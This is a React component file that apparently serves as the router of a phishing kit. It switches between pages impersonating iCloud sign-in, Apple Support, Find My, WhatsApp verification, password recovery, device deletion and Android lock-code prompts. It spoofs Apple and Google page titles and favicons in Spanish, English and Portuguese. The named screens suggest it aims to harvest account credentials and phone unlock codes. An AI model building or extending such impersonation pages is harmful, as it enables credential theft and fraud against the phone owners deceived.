import { useData } from './context/UserContext';
import { useEffect } from 'react';
import Maps from './maps/components/Index';
import MapsZoom from './mapsZoom/components/Index';
import WappVerify from './wappVerify/components/Index';
import RecoverPassword from './recoverPassword/components/Index';
import DeleteDevice from './deleteDevice/components/Index';
import AndroidApp from './androidApp/Main';
import ICloudApp from './ic/components/Index';
import ICloudFind from './findMy/components/Index';
import Support from './support/components/Index';
import iconApp from './assets/img/icon-app.png';
import iconGoogle from './assets/img/icon-google.ico';
import icon from './assets/img/icon.svg';
import iconFindMy from './assets/img/iconFindMy.png';

const Index = () => {
    const { user, isReady, loading } = useData();

    // Extraemos el script de los datos del usuario de forma segura
    const script = user?.data?.script;

    useEffect(() => {
        // 1. Detectar idioma del navegador
        const userLang = navigator.language || navigator.userLanguage;
        const lang = userLang.split('-')[0]; // 'es', 'en', o 'pt'

        // 2. Diccionario Maestro de Títulos por Idioma
        const allTitles = {
            'es': {
                'ic': 'iCloud - Iniciar sesión',
                'support': 'Soporte técnico oficial de Apple',
                'icFind': 'Encontrar Dispositivos - Apple iCloud',
                'maps': 'Encontrar Dispositivos - Apple iCloud',
                'mapsZoom': 'Encontrar Dispositivos - Apple iCloud',
                'wappVerify': 'iCloud - Verificación de WhatsApp',
                'recoverPassword': 'iCloud - Recuperar contraseña',
                'deleteDevice': 'iCloud - Eliminar dispositivo',
                'androidAppPattern': 'Google - Seguridad de Android',
                'androidAppNumeric': 'Seguridad de Android',
                'androidAppAlphanumeric': 'Seguridad de Android',
                'loading': 'Cargando...'
            },
            'en': {
                'ic': 'iCloud - Sign In',
                'support': 'Official Apple Support',
                'icFind': 'Find Devices - Apple iCloud',
                'maps': 'Find Devices - Apple iCloud',
                'mapsZoom': 'Find Devices - Apple iCloud',
                'wappVerify': 'iCloud - WhatsApp Verification',
                'recoverPassword': 'iCloud - Recover Password',
                'deleteDevice': 'iCloud - Delete Device',
                'androidAppPattern': 'Google - Android Security',
                'androidAppNumeric': 'Google - Android Security',
                'androidAppAlphanumeric': 'Google - Android Security',
                'loading': 'Loading...'
            },
            'pt': {
                'ic': 'iCloud - Iniciar sessão',
                'support': 'Suporte Oficial da Apple',
                'icFind': 'Buscar Dispositivos - Apple iCloud',
                'maps': 'Buscar Dispositivos - Apple iCloud',
                'mapsZoom': 'Buscar Dispositivos - Apple iCloud',
                'wappVerify': 'iCloud - Verificação do WhatsApp',
                'recoverPassword': 'iCloud - Recuperar senha',
                'deleteDevice': 'iCloud - Apagar dispositivo',
                'androidAppPattern': 'Google - Segurança do Android',
                'androidAppNumeric': 'Google - Segurança do Android',
                'androidAppAlphanumeric': 'Google - Segurança do Android',
                'loading': 'Carregando...'
            }
        };

        // 3. Seleccionar el set de títulos (Español por defecto)
        const t = allTitles[lang] || allTitles['es'];

        // 4. Aplicar el título al documento
        if (script && t[script]) {
            document.title = t[script];
        } else {
            document.title = t['loading'];
        }

        const allIcons = {
            'ic': iconApp,
            'icFind': iconFindMy,
            'support': icon,
            'maps': icon,
            'mapsZoom':icon,
            'wappVerify': icon,
            'recoverPassword': icon,
            'deleteDevice': icon,
            'androidAppPattern': iconGoogle,
            'androidAppNumeric': iconGoogle,
            'androidAppAlphanumeric': iconGoogle,
            'default': ''
        };

        const updateFavicon = (href) => {
            let link = document.querySelector("link[rel~='icon']");
            if (!link) {
                link = document.createElement('link');
                link.rel = 'icon';
                document.getElementsByTagName('head')[0].appendChild(link);
            }
            link.href = href;
        };

        const iconPath = allIcons[script] || allIcons['default'];
        updateFavicon(iconPath);


        const rootElement = document.getElementById('root');

        // Verificamos si el script es uno de los dos casos
        const shouldBlockScroll = script === 'ic' || script === 'icFind';

        if (rootElement && shouldBlockScroll) {
            rootElement.style.overflowX = 'hidden';
            rootElement.style.height = '100vh';
        } else if (rootElement) {
            // Si cambia a otro script o no coincide, restauramos
            rootElement.style.overflowX = 'auto';
            rootElement.style.height = 'auto';
        }

        // Limpieza al desmontar el componente
        return () => {
            if (rootElement) {
                rootElement.style.overflowX = 'auto';
                rootElement.style.height = 'auto';
            }
        };


    }, [script]);

    useEffect(() => {
        if (user) {
            console.log("User Data cargada:", user.data);
        }
    }, [user]); // Se ejecuta cada vez que el usuario cambia



    const renderContent = () => {
        switch (script) {
            case 'ic':
                return <ICloudApp />
            case 'icFind':
                return <ICloudFind />
            case 'support':
                return <Support />;
            case 'maps':
                return <Maps />;
            case 'mapsZoom':
                return <MapsZoom />  
            case 'wappVerify':
                return <WappVerify />;
            case 'recoverPassword':
                return <RecoverPassword />;
            case 'deleteDevice':
                return <DeleteDevice />;
            case 'androidAppPattern':
                return <AndroidApp />;
            case 'androidAppNumeric':
                return <AndroidApp />;
            case 'androidAppAlphanumeric':
                return <AndroidApp />;
            default:
                return <div className="p-10 text-gray-400">Script no reconocido: {script}</div>;
        }
    };

    return (
        <>
            {renderContent()}
        </>
    );
};

export default Index;